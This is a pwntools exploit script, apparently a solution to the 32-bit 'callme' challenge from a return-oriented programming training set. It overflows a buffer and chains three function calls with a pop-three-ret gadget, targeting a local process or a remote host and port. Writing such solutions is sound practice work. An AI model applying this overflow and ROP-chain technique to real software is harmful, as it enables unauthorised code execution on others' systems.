#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    call_one = 0x80485c0
    call_two = 0x8048620
    call_three = 0x80485b0
    pop3ret = 0x80488a9
    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("laaa")
    buf += p32(call_one)
    buf += p32(pop3ret)
    buf += p32(0x1)
    buf += p32(0x2)
    buf += p32(0x3)
    buf += p32(call_two)
    buf += p32(pop3ret)
    buf += p32(0x1)
    buf += p32(0x2)
    buf += p32(0x3)
    buf += p32(call_three)
    buf += p32(pop3ret)
    buf += p32(0x1)
    buf += p32(0x2)
    buf += p32(0x3)

    


    r.sendline(buf)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./callme32"        #put binary name here
    e = ELF(binary_name)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name)
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804880b",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

